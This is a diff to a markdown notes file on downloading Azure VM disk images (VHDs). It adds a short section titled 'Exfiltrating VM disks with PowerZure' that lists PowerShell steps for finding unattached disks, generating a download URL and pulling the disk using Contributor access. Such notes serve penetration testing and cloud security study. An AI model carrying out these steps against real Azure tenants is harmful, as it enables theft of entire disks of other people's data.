@@ -13,3 +13,17 @@
 ## IMPORTANT NOTE: When downloading a VHD file, keep in mind the size of the file. Typical HTTP web downloads from the Azure portal may struggle with large disks. Additionally, you may want to use an Azure VM, with sufficient disk space, for copying the VHD file. By using the Azure backplane network to copy to a VM disk, you may save significant time in the download process.
 
 ### If the disks are encrypted with custom-managed keys, you will need to get the key from the key vault to decrypt it.
+
+# Exfiltrating VM disks with PowerZure
+
+## Steps:
+
+ - Connect-AzAccount (Authenticate to the account with Contributor access)
+
+ - Import-Module PowerZure.ps1 (Import PowerZure module)
+
+ - Get-AzDisk | Where-Object {$_.DiskState -ne "Attached"} | Select Name, DiskState, Encryption (Obtain a list of all unattached VM disks)
+
+ - Get-AzureVMDisk -DiskName DISK_NAME
+
+ - Make note of the generated URL and download the disk from there.
